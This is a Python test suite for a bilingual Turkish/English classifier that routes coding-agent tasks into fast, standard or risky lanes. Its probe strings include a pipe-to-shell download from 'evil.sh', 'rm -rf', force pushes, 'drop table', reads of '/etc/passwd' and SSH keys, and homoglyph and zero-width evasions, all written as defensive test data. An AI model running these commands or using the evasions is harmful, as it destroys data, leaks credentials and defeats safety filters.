"""Lane safety, including bilingual cases and generated adversarial families."""

import itertools
import os
from pathlib import Path
import random
import sys
import time
import unicodedata
import unittest
from unittest import mock

from tests.unit._timing import scaled
from tests.unit.test_gitutil import GitFixture

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "plugins" / "orcexe" / "src"))
from orcexe import classify as classifier
from orcexe.classify import Classification, RiskMap, Signal, classify, classify_repo, load_risk_map
from orcexe import gitutil


TREE = ["src/exitcodes.py", "README.md", "tests/test_cli.py", "docs/guide.md",
        ".github/workflows/ci.yml", "package-lock.json"]
# Keep the complete product for opt-in runs, matching test_redact's switch.
SLOW_TESTS = os.environ.get("ORCEXE_SLOW_TESTS") == "1"
COMBINATION_STRIDE = 50
# task, files, expected lane, required signal ids, expected targets (None = any).
CASES = [
    ("vendor/lib/x.py'ye docstring ekle", ["vendor/lib/x.py"], "standard", {"target_class_denied"}, ("vendor/lib/x.py",)),
    ("node_modules/x/index.js'ye yorum ekle", ["node_modules/x/index.js"], "standard", {"target_class_denied"}, ("node_modules/x/index.js",)),
    ("`exitcodes`'a docstring ekle", TREE, "fast", {"target_file"}, ("src/exitcodes.py",)),
    ("`exitcodes`'a docstring ekle", ["a/exitcodes.py", "b/exitcodes.py"], "standard", {"target_ambiguous"}, ("a/exitcodes.py", "b/exitcodes.py")),
    ("README'ye kurulum bölümü ekle", TREE, "fast", {"target_file"}, ("README.md",)),
    ("Şifre sıfırlama ekranını düzelt", TREE, "risky", {"risk_word", "target_none"}, ()),
    ("ŞİFRE README.md", TREE, "risky", {"risk_word", "target_file"}, None),
    ("AUTH'a README.md ekle", TREE, "risky", {"risk_word", "target_file"}, None),
    ("Fix .github/workflows/ci.yml", TREE, "risky", {"risk_path", "target_file"}, None),
    ("Update package-lock.json", TREE, "risky", {"risk_path", "target_file"}, None),
    ("tüm testleri düzelt", TREE, "standard", {"scope_broad", "target_none"}, ()),
    ("", TREE, "standard", {"task_empty", "target_none"}, ()),
    ("README.md düzenle", None, "standard", {"mode", "target_none"}, ()),
    ("README.md düzenle", [], "standard", {"mode", "target_none"}, ()),
    ("login README.md", TREE, "risky", {"risk_word", "target_file"}, None),
    ("Add a comment to exitcodes.py", TREE, "fast", {"target_file"}, ("src/exitcodes.py",)),
    ("Edit src/exitcodes.py and README.md", TREE, "standard", {"target_ambiguous"}, None),
    ("Edit exitcodes.py", ["a/exitcodes.py", "b/exitcodes.py"], "standard", {"target_ambiguous"}, None),
    ("Edit `absent`", TREE, "standard", {"target_none", "target_unresolved"}, ()),
    ("Fix missing.py and README.md", TREE, "standard", {"target_unresolved"}, None),
    ("Fix `absent` and README.md", TREE, "standard", {"target_unresolved"}, None),
    ("Fix all README.md", TREE, "standard", {"scope_broad"}, None),
    ("Fix every README.md", TREE, "standard", {"scope_broad"}, None),
    ("Fix entire README.md", TREE, "standard", {"scope_broad"}, None),
    ("Fix whole README.md", TREE, "standard", {"scope_broad"}, None),
    ("Fix across README.md", TREE, "standard", {"scope_broad"}, None),
    ("Fix everywhere README.md", TREE, "standard", {"scope_broad"}, None),
    ("Refactor README.md", TREE, "standard", {"scope_broad"}, None),
    ("Rewrite README.md", TREE, "standard", {"scope_broad"}, None),
    ("Migrate README.md", TREE, "risky", {"risk_word", "scope_broad"}, None),
    ("Bütün README.md", TREE, "standard", {"scope_broad"}, None),
    ("Hepsi README.md", TREE, "standard", {"scope_broad"}, None),
    ("Her README.md", TREE, "standard", {"scope_broad"}, None),
    ("Baştan README.md", TREE, "standard", {"scope_broad"}, None),
    ("Yeniden yaz README.md", TREE, "standard", {"scope_broad"}, None),
    ("Refaktör README.md", TREE, "standard", {"scope_broad"}, None),
    ("Fix *.py README.md", TREE, "standard", {"scope_broad"}, None),
    ("Fix **/README.md", TREE, "standard", {"scope_broad"}, None),
    ("ödemeyi düzelt README.md", TREE, "risky", {"risk_word"}, None),
    ("migrasyonu düzelt README.md", TREE, "risky", {"risk_word"}, None),
    ("Şifre README.md", TREE, "risky", {"risk_word"}, None),
    ("şifre README.md", TREE, "risky", {"risk_word"}, None),
    ("S\u0327I\u0307FRE README.md", TREE, "risky", {"risk_word"}, None),
    ("ŞI\u0307FRE README.md", TREE, "risky", {"risk_word"}, None),
    ("BILLING README.md", TREE, "risky", {"risk_word"}, None),
    ("CANLI README.md", TREE, "risky", {"risk_word"}, None),
    ("SIR README.md", TREE, "risky", {"risk_word"}, None),
    ("api_key README.md", TREE, "risky", {"risk_word"}, None),
    ("private_key README.md", TREE, "risky", {"risk_word"}, None),
    ("author README.md", TREE, "risky", {"risk_word"}, None),
    ("Fix src/auth/views.py README.md", TREE, "risky", {"risk_word", "risk_path"}, None),
    ("Fix .env.local README.md", TREE, "risky", {"risk_path"}, None),
    ("Fix Dockerfile README.md", TREE, "risky", {"risk_path"}, None),
    ("Fix infra/main.tf README.md", TREE, "risky", {"risk_path"}, None),
    ("Fix keys/client.PEM README.md", TREE, "risky", {"risk_path"}, None),
    ("Fix .gitlab-ci.yml README.md", TREE, "risky", {"risk_path"}, None),
    ("Fix .circleci/config.yml README.md", TREE, "risky", {"risk_path"}, None),
    ("README.md\0", TREE, "standard", {"input_nul"}, None),
    ("Fix README.md", ["README.md", "bad\0.py"], "standard", {"input_nul"}, None),
    ("x" * 10001 + " README.md", TREE, "standard", {"task_too_long"}, None),
    ("Fix ./README.md", TREE, "fast", {"target_file"}, ("README.md",)),
    ("Fix `exitcodes` exitcodes.py src/exitcodes.py", TREE, "standard", {"target_file", "intent_none"}, ("src/exitcodes.py",)),
    ("Fix the typo in src/exitcodes.py", ["src/exitcodes.py", "other/exitcodes.py"], "fast", {"target_file"}, ("src/exitcodes.py",)),
    ("Fix x.py", ["docs/x.py", "auth/x.py"], "risky", {"risk_path", "target_ambiguous"}, None),
    ("Fix ././README.md", TREE, "fast", {"target_file"}, ("README.md",)),
    ("Fix ../README.md", TREE, "standard", {"path_invalid"}, None),
    ("Fix /README.md", TREE, "standard", {"path_invalid"}, None),
    ("Fix docs//README.md", TREE, "standard", {"path_invalid"}, None),
    ("Fix README.md and `missing", TREE, "standard", {"target_unresolved"}, None),
    ("README.md'yi sil", TREE, "standard", {"destructive"}, ("README.md",)),
    ("delete README.md", TREE, "standard", {"destructive"}, ("README.md",)),
    ("rm -rf README.md", TREE, "standard", {"destructive"}, ("README.md",)),
    ("README.md git push --force", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md'yi commit et ve push'la", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md npm publish", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md drop table users", TREE, "risky", {"destructive", "outward_action"}, ("README.md",)),
    ("README.md DROP DATABASE", TREE, "risky", {"destructive", "outward_action"}, ("README.md",)),
    ("README.md kubectl apply", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md terraform apply", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md a\u200buth", TREE, "risky", {"risk_word"}, ("README.md",)),
    ("README.md ａｕｔｈ", TREE, "risky", {"risk_word"}, ("README.md",)),
    ("README.md аuth", TREE, "standard", {"mixed_script"}, ("README.md",)),
    ("README.md'ye env değişkenlerini ekle", TREE, "risky", {"risk_word"}, ("README.md",)),
    ("README.md'ye kullanıcı verisini aktar", TREE, "risky", {"risk_word"}, ("README.md",)),
    ("README.md globally", TREE, "standard", {"scope_broad"}, ("README.md",)),
    ("README.md αuth", TREE, "standard", {"mixed_script"}, ("README.md",)),
    ("README.md αuth push", TREE, "risky", {"mixed_script", "outward_action"}, ("README.md",)),
    ("README.md insert into records", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md update records set name = value", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md update records where id = 1 then set name", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md delete from records", TREE, "risky", {"destructive", "outward_action"}, ("README.md",)),
    ("README.md set then update", TREE, "standard", {"unrecognized_token"}, ("README.md",)),
    ("README.md postgres", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md tagline", TREE, "risky", {"outward_action"}, ("README.md",)),
    ("README.md apply formatting", TREE, "risky", {"outward_action"}, ("README.md",)),
]


# Frozen copies of the owner-provided probes; no external files are needed.
PROBE_FIXTURES = [
    ('T23-probe.py',
     ['README.md', 'src/app.py', 'src/exitcodes.py', 'docs/guide.md', '.github/workflows/ci.yml', 'package-lock.json', 'src/Auth/Views.py', 'config/.env.local', 'db/Migrations/0001.sql', 'infra/main.tf', 'keys/server.PEM', 'src/secrets.py', 'web/Dockerfile.prod', 'src/payments/api.py', 'src/util.py', 'a b/c d.py', 'ünicode/dosya.py'],
     [
         'README.md düzelt',
         'Fix the typo in README.md',
         "README.md'deki yazım hatasını düzelt",
         'PASSWORD reset in README.md',
         "parolayı README.md'ye yaz",
         'Parola README.md',
         'PAROLA',
         'ŞİFRELEME README.md',
         "TOKEN süresini README.md'de yaz",
         "ödemeleri README.md'ye ekle",
         'ÖDEME README.md',
         'src/Auth/Views.py düzelt',
         'SRC/AUTH/VIEWS.PY düzelt',
         'config/.env.local düzelt',
         '.env.local düzelt',
         'db/Migrations/0001.sql düzelt',
         'infra/main.tf düzelt',
         'server.PEM düzelt',
         'keys/server.pem düzelt',
         'src/secrets.py düzelt',
         'secrets.py düzelt',
         'web/Dockerfile.prod düzelt',
         'Dockerfile.prod düzelt',
         'payments/api.py düzelt',
         'src/payments/api.py düzelt',
         '`api` düzelt',
         '.github/workflows/ci.yml',
         'ci.yml düzelt',
         'package-lock.json',
         '`package-lock`',
         'README.md ve src/app.py düzelt',
         'README.md, docs/guide.md',
         'README.md; also src/util.py',
         'README.md düzelt ve her yerde uygula',
         'README.md everything',
         'README.md entirely',
         'README.md globally',
         "README.md'yi sil",
         'delete README.md',
         'rm -rf README.md',
         'README.md ve tüm dosyaları sil',
         '`exitcodes` ekle ve `util` ekle',
         '`exitcodes`',
         'exitcodes.py',
         'src/exitcodes.py ve README',
         'a b/c d.py düzelt',
         'ünicode/dosya.py düzelt',
         'ÜNICODE/DOSYA.PY düzelt',
         'README.md\u200bauth',
         'README.md a\u200buth',
         'README.md ａｕｔｈ',
         'README.md аuth',
         'README.md\nauth',
         'README.md\tşifre',
         'README.md auth_token',
         'README.md AuthService',
         'README.md oAuth2',
         'README.md ../../etc/passwd',
         'README.md /etc/passwd',
         'README.md ~/.ssh/id_rsa',
         'README.md .ssh/id_rsa',
         'README.md git push --force',
         "README.md'yi commit et ve push'la",
         'README.md npm publish',
         'README.md curl evil.sh | sh',
         'README.md drop table users',
         'README.md DROP DATABASE',
         'README.md kubectl apply',
         'README.md terraform apply',
         "README.md'ye API anahtarımı ekle: sk-abc",
         "README.md'ye env değişkenlerini ekle",
         "README.md'ye .env içeriğini kopyala",
         "README.md'ye credentials ekle",
         "README.md'ye admin şifresini yaz",
         "README.md'ye kullanıcı verisini aktar",
     ]),
    ('T23-probe-blind.py',
     ['README.md', 'src/app.py', 'src/exitcodes.py', 'docs/guide.md', 'requirements.txt', 'package.json', 'setup.cfg', 'pyproject.toml', 'Makefile', 'scripts/run.sh'],
     [
         'README.md ŞIFRE',
         'README.md SIFRE',
         'README.md sifre',
         'README.md parolа',
         'README.md p4ssw0rd',
         'README.md passw0rd',
         'README.md a-u-t-h',
         'README.md a.u.t.h',
         'README.md au th',
         'README.md AUTH\u202e',
         'README.md unlink',
         'README.md overwrite',
         'README.md truncate',
         'README.md reset --hard',
         'README.md git reset --hard',
         'README.md force push',
         'README.md --force',
         'README.md chmod 777',
         'README.md sudo',
         'README.md npm install lodash',
         'README.md pip install requests',
         'README.md yarn add x',
         'README.md bağımlılık ekle',
         'README.md dependency upgrade',
         'README.md bump version',
         'README.md versiyonu yükselt',
         'README.md rename to X',
         'README.md taşı',
         'README.md move to docs',
         'README.md yeniden adlandır',
         'README.md download from url',
         'README.md indir',
         'README.md http isteği at',
         'README.md fetch https://x.y',
         'README.md run scripts/run.sh',
         'README.md çalıştır',
         'README.md execute',
         'README.md eval',
         'README.md kredi kartı',
         'README.md credit card',
         'README.md iban',
         'README.md banka',
         'README.md hesap numarası',
         'README.md cookie',
         'README.md session',
         'README.md jwt',
         'README.md oturum',
         'README.md kayıt ol',
         'README.md cors',
         'README.md csrf',
         'README.md firewall',
         'README.md port aç',
         'README.md hash',
         'README.md bcrypt',
         'README.md ssl',
         'README.md tls',
         'README.md certificate',
         'README.md sertifika',
         'README.md lisansı değiştir',
         'README.md change license',
         'README.md telemetry',
         'README.md analytics',
         'README.md tracking',
         'README.md log user ip',
         'README.md admin',
         'README.md root',
         'README.md 🔑 ekle',
         'README.md rm',
         'README.md rmdir',
         'README.md sil*',
         'README.md s-i-l',
         'README.md temizlik',
         'requirements.txt düzelt',
         'package.json düzelt',
         'pyproject.toml düzelt',
         'Makefile düzelt',
         'scripts/run.sh düzelt',
         'setup.cfg düzelt',
         'readme.md düzelt',
         'README.MD düzelt',
         'README düzelt',
         '`README` düzelt',
         'docs/guide.md düzelt ve README.md',
     ]),
]


class ClassifyTests(unittest.TestCase):
    def test_round3_positive_table(self):
        files = ["README.md", "docs/guide.md", "src/exitcodes.py", "src/app.py"]
        cases = [
            ("`exitcodes`'a docstring ekle", "source", "add_docstring"),
            ("exitcodes.py'ye docstring ekle", "source", "add_docstring"),
            ("Add a docstring to src/exitcodes.py", "source", "add_docstring"),
            ("README'ye kurulum bölümü ekle", "doc", "add_section"),
            ("README.md'ye kullanım örneği ekle", "doc", "add_section"),
            ("Add a usage section to README.md", "doc", "add_section"),
            ("README.md'deki yazım hatasını düzelt", "doc", "fix_typo"),
            ("Fix the typo in README.md", "doc", "fix_typo"),
            ("docs/guide.md'deki paragrafı netleştir", "doc", "clarify_paragraph"),
            ("src/app.py'deki yorumdaki yazım hatasını düzelt", "source", "fix_typo"),
            ("README.md'yi güncelle", "doc", "update_doc"),
        ]
        for task, target_class, intent in cases:
            with self.subTest(task=task):
                result = classify(task, files)
                self.assertEqual(result.lane, "fast", result)
                self.assertEqual({s.id for s in result.signals},
                                 {"target_file", "target_class", "intent"})
                self.assertIn(Signal("target_class", target_class), result.signals)
                self.assertIn(Signal("intent", intent), result.signals)

    def test_round3_frozen_probes(self):
        # The Turkish typo task is also explicitly required by the positive
        # table; that specific requirement takes precedence over the probe rule.
        exceptions = {"README.md düzelt", "Fix the typo in README.md",
                      "README.md'deki yazım hatasını düzelt"}
        count = 0
        for name, files, cases in PROBE_FIXTURES:
            for task in cases:
                with self.subTest(probe=name, task=task):
                    result = classify(task, files)
                    if task not in exceptions:
                        self.assertNotEqual(result.lane, "fast", result)
                    count += 1
        self.assertEqual(count, 158)

    def test_round3_target_classes(self):
        docs = ".md .markdown .rst .txt .adoc".split()
        source = (".py .js .mjs .cjs .ts .tsx .jsx .go .rs .java .kt .swift "
                  ".rb .php .c .h .cc .cpp .hpp .cs").split()
        for extension in docs + source:
            for path in ("src/example" + extension, "src/EXAMPLE" + extension.upper()):
                with self.subTest(path=path):
                    result = classify("Fix the typo in " + path, [path])
                    self.assertEqual(result.lane, "fast", result)
                    self.assertIn(Signal("target_class", "doc" if extension in docs else "source"),
                                  result.signals)
        denied = ["requirements.txt", "requirements-dev.txt", "constraints.txt",
                  "constraints-ci.txt", "notes.lock.md", "notes.locked.txt",
                  "LICENSE.md", "COPYING.txt", "NOTICE.adoc", "LICENSE-extra.py",
                  "setup.py", "conftest.py", "manage.py", "noxfile.py", "fabfile.py",
                  "vite.config.js", "vite.config.ts", "vite.config.mjs", "vite.config.cjs",
                  "gulpfile.js", "Gruntfile.ts", "package.json", "requirements.in",
                  "setup.cfg", "pyproject.toml", "Makefile", "file.sh"]
        for directory in ("scripts bin tools hooks .husky .git ci deploy infra ops "
                          "vendor third_party third-party node_modules .venv venv env "
                          "site-packages dist build out target .next coverage "
                          "__generated__ generated gen").split():
            denied.extend((directory + "/example.py", "nested/" + directory + "/guide.md"))
        # Resolved basenames/symbols must inherit exclusions, too.
        for path in denied:
            for path in (path, "nested/" + path.upper()):
                for mention in (path, path.rsplit("/", 1)[-1]):
                    with self.subTest(path=path, mention=mention):
                        result = classify("Fix the typo in " + mention, [path])
                        self.assertNotEqual(result.lane, "fast")
                        self.assertIn("target_class_denied", {s.id for s in result.signals})
        for path in (".github/example.py", "nested/migrations/example.py", "src/secrets/guide.md"):
            result = classify("Fix the typo in " + path.rsplit("/", 1)[-1], [path])
            self.assertEqual(result.lane, "risky")
            self.assertIn("target_class_denied", {s.id for s in result.signals})
        result = classify("`example`'a docstring ekle", ["tools/example.py"])
        self.assertIn("target_class_denied", {s.id for s in result.signals})

    def test_round3_entire_task_and_single_intent(self):
        files = TREE + ["src/app.py"]
        for task in ("README.md", "README.md usage", "Fix README", "`README` düzelt",
                     "Add a docstring to README.md", "README.md güncelle ve düzelt",
                     "README.md güncelle güncelle", "Fix the typo in README.md and add a section",
                     "README.md yazım hatasını düzelt ve paragrafı netleştir",
                     "README.md güncelle usage", "usage README.md güncelle",
                     "README.md güncelle kurulum", "README.md düzelt typo",
                     "README.md güncelle 42", "README.md güncelle ١", "README.md güncelle ²",
                     'README.md güncelle "sudo"', 'README.md güncelle "jwt"',
                     "README.md güncelle &&", "README.md güncelle 🔑",
                     "@target güncelle README.md", "README.md güncelle_",
                     "README.md güncelle ;", "README.md güncelle `usage`"):
            with self.subTest(task=task):
                self.assertNotEqual(classify(task, files).lane, "fast")
        for task in ("README.md güncelle ve düzelt", "Fix the typo in README.md and add a section"):
            self.assertIn("intent_multiple", {s.id for s in classify(task, files).signals})
        self.assertIn("intent_none", {s.id for s in classify("README.md usage", files).signals})
        for extra in ("sudo", "SIFRE", "p4ssw0rd", "session", "jwt", "iban", "kredi kartı"):
            result = classify("README.md güncelle " + extra, files)
            unknown = [s.detail for s in result.signals if s.id == "unrecognized_token"]
            self.assertEqual(unknown, [str(len(extra.split()))])
            self.assertTrue(all(extra not in s.detail for s in result.signals))
        self.assertEqual(classify('Fix the "typo" in README.md', files).lane, "fast")
        self.assertEqual(classify("Fix the typo in docs/guide2.md", ["docs/guide2.md"]).lane, "fast")

    def test_round3_unknown_text_cannot_extend_patterns(self):
        files = TREE + ["src/app.py"]
        tasks = ("Add a docstring to src/exitcodes.py", "src/app.py yorum ekle",
                 "Add a usage section to README.md", "Fix the typo in README.md",
                 "docs/guide.md paragrafı netleştir", "README.md güncelle", "README.md düzelt")
        for task, extra in itertools.product(tasks, ("SIFRE", "p4ssw0rd", "sudo", "session", "jwt",
                                                     "npm install", "reset --hard", "kredi kartı", "42")):
            for variant in (extra + " " + task, task + " " + extra, task + ' "' + extra + '"'):
                with self.subTest(task=variant):
                    result = classify(variant, files)
                    self.assertEqual(result.lane, "standard")
                    self.assertIn("unrecognized_token", {s.id for s in result.signals})

    def test_round3_suffixes_and_length_bounds(self):
        for suffix in ("", "ı", "i", "u", "ü", "a", "e", "ya", "ye", "yı", "yi",
                       "da", "de", "ta", "te", "dan", "den", "tan", "ten", "nın", "nin",
                       "nun", "nün", "ın", "in", "un", "ün", "ler", "lar", "leri", "ları",
                       "sı", "si", "su", "sü", "na", "ne", "ndan", "nden", "nda", "nde",
                       "ki", "deki", "daki", "ını", "ini", "nı", "ni", "nu", "nü",
                       "dakiler", "lardaki", "dandandan"):
            with self.subTest(suffix=suffix):
                task = "docs/guide.md'deki paragraf" + suffix + " netleştir"
                self.assertEqual(classify(task, TREE).lane, "fast")
        for task in ("docs/guide.md paragrafdandandandan netleştir",
                     "docs/guide.md paragrafxyz netleştir",
                     "docs/guide.md'dandandandan paragraf netleştir",
                     "README.md'xyz güncelle"):
            with self.subTest(task=task):
                result = classify(task, TREE)
                self.assertEqual(result.lane, "standard")
                self.assertIn("unrecognized_token", {s.id for s in result.signals})
        for size in (199, 200, 201):
            task = "README.md güncelle".ljust(size)
            result = classify(task, TREE)
            self.assertEqual(result.lane, "fast" if size <= 200 else "standard")
            self.assertEqual("task_too_long_for_fast" in {s.id for s in result.signals}, size > 200)
        for count in (25, 26):
            task = "README.md güncelle " + "a " * (count - 2)
            result = classify(task, TREE)
            self.assertEqual("task_too_long_for_fast" in {s.id for s in result.signals}, count > 25)
        for files in (None, [], ["README.md", "invalid\0.py"], ["README.md", "../invalid.py"]):
            self.assertEqual(classify("README.md güncelle", files).lane, "standard")
        # Risk keeps precedence even with a valid production and a length block.
        result = classify("README.md güncelle auth".ljust(201), TREE)
        self.assertEqual(result.lane, "risky")
        self.assertIn("task_too_long_for_fast", {s.id for s in result.signals})

    def test_case_table(self):
        self.assertGreaterEqual(len(CASES), 40)
        passed = 0
        for index, (task, files, lane, ids, targets) in enumerate(CASES, 1):
            with self.subTest(case=index, task=task):
                result = classify(task, files)
                self.assertEqual(result.lane, lane)
                actual_ids = {signal.id for signal in result.signals}
                self.assertTrue(ids <= actual_ids, (ids, actual_ids))
                if targets is not None:
                    self.assertEqual(result.targets, targets)
                self.assertEqual(result.mode, "everyday" if files is None else "new" if not files else "existing")
                if lane == "fast":
                    self.assertEqual(actual_ids, {"target_file", "target_class", "intent"})
                passed += 1
        print("classifier case table: {}/{} passed".format(passed, len(CASES)))

    def test_safety_property_extended_combinations(self):
        rng = random.Random(23)
        count = sampled = fast_count = 0
        # Preserve the round-1 inputs and add each new safety family. Expected
        # lanes/signals are independent of the classifier's stem constants.
        risks = [("", None, False), ("ŞİFRE", "risk_word", True),
                 ("AUTH'a", "risk_word", True), ("delete", "destructive", False),
                 ("push", "outward_action", True), ("user data", "risk_word", True),
                 ("a\u200buth", "risk_word", True), ("ａｕｔｈ", "risk_word", True),
                 ("аuth", "mixed_script", False), ("αuth", "mixed_script", False)]
        # Deterministic stride sample plus every spec-fast combination by default;
        # ORCEXE_SLOW_TESTS=1 checks the exhaustive, reproducibly shuffled product.
        # Include duplicate mentions, distinct targets and risky/unknown paths.
        combinations = list(itertools.product(range(3), range(len(risks)), range(3),
                                              range(4), range(3), range(8)))
        rng.shuffle(combinations)
        for index, (target_count, risk, broad, path_risk, mode, variant) in enumerate(combinations):
            count += 1
            expected_fast = (target_count == 1 and risk == 0 and path_risk == 0
                             and broad == 0 and mode == 0 and variant < 4)
            safe_names = [("src/alpha.py", "docs/beta.md"),
                          ("alpha.py", "beta.md"),
                          ("`alpha`", "`beta`")][variant % 3]
            targets = list(safe_names[:target_count])
            if path_risk == 1:
                targets.append(".env.local")
            elif path_risk == 2:
                targets.append("untracked/client.pem")
            elif path_risk == 3:
                # Risk via a resolved basename, absent from the task itself.
                targets.append("ci.yml")
            if variant >= 4 and targets:
                targets.append(targets[0])
            fragment, signal_id, risky = risks[risk]
            fragments = targets + [fragment] + ["", "tüm", "all"][broad: broad + 1]
            rng.shuffle(fragments)
            # Shuffle even skipped fragments so the sampled tasks match a full run.
            if not (SLOW_TESTS or index % COMBINATION_STRIDE == 0 or expected_fast):
                continue
            task = "Fix the typo in " + " ".join(fragments)
            tree = ["src/alpha.py", "docs/beta.md", ".env.local", ".github/workflows/ci.yml"]
            files = tree if mode == 0 else [] if mode == 1 else None
            result = classify(task, files)
            self.assertEqual(result.lane == "fast", expected_fast,
                             (task, files, result))
            if signal_id:
                self.assertIn(signal_id, {s.id for s in result.signals}, (task, result))
            if risky or path_risk in (1, 2) or path_risk == 3 and mode == 0:
                self.assertEqual(result.lane, "risky", (task, result))
            fast_count += result.lane == "fast"
            sampled += 1
        self.assertGreaterEqual(count, 2000)
        self.assertGreater(fast_count, 0)
        self.assertEqual(fast_count, 4)
        self.assertGreaterEqual(sampled, (count + COMBINATION_STRIDE - 1) // COMBINATION_STRIDE)
        if SLOW_TESTS:
            self.assertEqual(sampled, count)
        print("classifier safety property: sampled={} total={}; {} fast; slow={}".format(
            sampled, count, fast_count, SLOW_TESTS))

    def test_round2_stem_families_and_suffixes(self):
        families = [
            ("destructive", "standard", "delete remove rm purge wipe erase sil kaldır temizle boşalt".split() + ["yok et"]),
            ("outward_action", "risky", "push publish deploy commit merge rebase tag upload send email mail post webhook curl wget ssh scp rsync kubectl terraform helm twine gh apply gönder yayınla yükle paylaş birleştir drop alter truncate grant revoke database table".split() + [
                "docker push", "npm publish", "pip upload", "insert into", "delete from", "update records set"]),
            ("risk_word", "risky", "env environment pii gdpr kvkk personal kişisel customer müşteri ssn tckn kimlik".split() + [
                "ortam değişken", "kullanıcı veri", "user data"]),
            ("scope_broad", "standard", ["global", "globally", "everything", "her yer", "her şey", "project-wide", "proje genel"]),
        ]
        for signal_id, lane, stems in families:
            for stem, suffix in itertools.product(stems, ("", "suffix")):
                with self.subTest(stem=stem, suffix=suffix):
                    result = classify(stem.upper() + suffix + " README.md", TREE)
                    self.assertEqual(result.lane, lane)
                    self.assertIn(signal_id, {s.id for s in result.signals})
        for stem in ("drop", "truncate"):
            result = classify("README.md " + stem, TREE)
            self.assertTrue({"destructive", "outward_action"} <= {s.id for s in result.signals})

    def test_normalization_all_format_characters_and_fullwidth(self):
        format_chars = [chr(n) for n in range(sys.maxunicode + 1)
                        if unicodedata.category(chr(n)) == "Cf"]
        for stem, signal_id in (("auth", "risk_word"), ("push", "outward_action"),
                                ("delete", "destructive"), ("env", "risk_word")):
            # Every Unicode Cf character (not just a list of common zero-width
            # characters), at every interior boundary of each safety family.
            for char, index in itertools.product(format_chars, range(1, len(stem))):
                with self.subTest(stem=stem, char=ord(char), index=index):
                    result = classify("README.md " + stem[:index] + char + stem[index:], TREE)
                    self.assertIn(Signal(signal_id, stem), result.signals)
                    self.assertNotEqual(result.lane, "fast")
            fullwidth = "".join(chr(ord(c) + 0xfee0) for c in stem)
            result = classify("README.md " + fullwidth, TREE)
            self.assertIn(Signal(signal_id, stem), result.signals)
        self.assertEqual(classifier._words("Ａ\u200bＵＴＨ ŞI\u0307FRE"), ["auth", "şifre"])

    def test_mixed_scripts_with_normalization_and_safe_details(self):
        for token in ("аuth", "αuth", "a\u200bυth", "ａυth", "аuthVALUE", "aЖ", "aΩ"):
            result = classify("README.md " + token, TREE)
            self.assertEqual(result.lane, "standard")
            self.assertIn(Signal("mixed_script", "Latin with Cyrillic/Greek"), result.signals)
            self.assertTrue(all("VALUE" not in s.detail for s in result.signals))
        for token in ("данные", "αβγ", "şİfreless", "a-Ж", "a Ω"):
            self.assertNotIn("mixed_script", {s.id for s in classify("README.md " + token, TREE).signals})

    def test_all_default_stems_and_suffixes(self):
        for stem in classifier._RISK_WORDS:
            with self.subTest(stem=stem):
                result = classify(stem.upper() + "suffix README.md", TREE)
                self.assertEqual(result.lane, "risky")
                self.assertIn(Signal("risk_word", stem), result.signals)

    def test_all_default_risk_paths_case_insensitive(self):
        paths = [".github/workflows/ci.yml", ".gitlab-ci.yml", ".circleci/config.yml",
                 "migrations/a.py", "src/migrations/a.py", "migrate/a.py", ".env",
                 "a/.env.test", "a/secrets.txt", "authorization.py", "payment.py",
                 "billing.txt", "a/b.pem", "client.key", "Dockerfile", "a/Dockerfile.dev",
                 "main.tf"] + classifier._LOCKS
        for path in paths:
            for name in (path, path.upper(), "a/" + path if path in classifier._LOCKS else path):
                with self.subTest(path=name):
                    result = classify("Fix " + name, [name])
                    self.assertEqual(result.lane, "risky")
                    self.assertIn("risk_path", {s.id for s in result.signals})

    def test_segment_glob_semantics(self):
        cases = [
            ("src/*", "src/a/b.py", False), ("src/*", "src/a.py", True),
            ("src/**", "src", True), ("src/**", "src/a/b.py", True),
            ("**/migrations/**", "migrations/a.py", True),
            ("**/migrations/**", "x/y/migrations/a.py", True),
            ("**/.env*", ".env", True), ("**/.env*", "x/.env.test", True),
            ("**/*.key", "x/y/z.KEY", True), ("**/*.key", "x.key/z", False),
            ("a/**/**/b", "a/b", True), ("a/**/b", "a/x/y/b", True),
            ("a/*/b", "a/b", False), ("a/?/b", "a/x/b", True),
            ("a/?/b", "a/xx/b", False), ("a/[x]", "a/x", False),
            (".github/**", "nested/.github/a", False),
        ]
        for pattern, path, expected in cases:
            with self.subTest(pattern=pattern, path=path):
                self.assertEqual(classifier._glob(pattern, path), expected)
        self.assertFalse(classifier._glob("**/" * 200 + "absent", "x/" * 200 + "file"))
        self.assertFalse(classifier._glob("*a" * 200 + "z", "a" * 400))

    def test_collects_all_rules_and_bounds_secret_free_details(self):
        result = classify("auth tokenVALUE all README.md .env.SECRET_VALUE", TREE)
        ids = {s.id for s in result.signals}
        self.assertTrue({"risk_word", "risk_path", "scope_broad", "target_file", "target_unresolved"} <= ids)
        self.assertTrue(all("VALUE" not in s.detail for s in result.signals))
        path = "x" * 220 + ".py"
        result = classify("Fix " + path, [path])
        self.assertTrue(all(len(s.detail) <= 200 for s in result.signals))
        with self.assertRaises(AttributeError):
            result.lane = "standard"
        with self.assertRaises(AttributeError):
            result.signals[0].detail = "changed"

    def test_determinism_including_shuffled_files(self):
        rng = random.Random(23)
        files = TREE + ["other/exitcodes.py"]
        task = "auth all `exitcodes` README.md .env.local"
        expected = classify(task, files)
        for _ in range(20):
            rng.shuffle(files)
            self.assertEqual(classify(task, files), expected)
            self.assertEqual(classify(task, files), classify(task, files))

    def test_unknown_inputs_and_wrong_types(self):
        for task, files in [("   ", TREE), ("README.md", ["/README.md"]),
                            ("README.md", ["../README.md"]),
                            ("README.md", ["README.md", ""]),
                            ("README.md", ["README.md", "a//b.py"]),
                            ("README.md", ["README.md", "a/./b.py"]),
                            ("README.md", ["README.md", "\0"]),
                            ("`hello world` README.md", TREE)]:
            with self.subTest(task=task, files=files):
                self.assertNotEqual(classify(task, files).lane, "fast")
        for task, files, risk_map in [(None, TREE, None), (1, TREE, None),
                ("fix", "README.md", None), ("fix", [1], None),
                ("fix", {"a.py"}, None), ("fix", TREE, {})]:
            with self.subTest(task=task, files=files), self.assertRaises(TypeError):
                classify(task, files, risk_map)
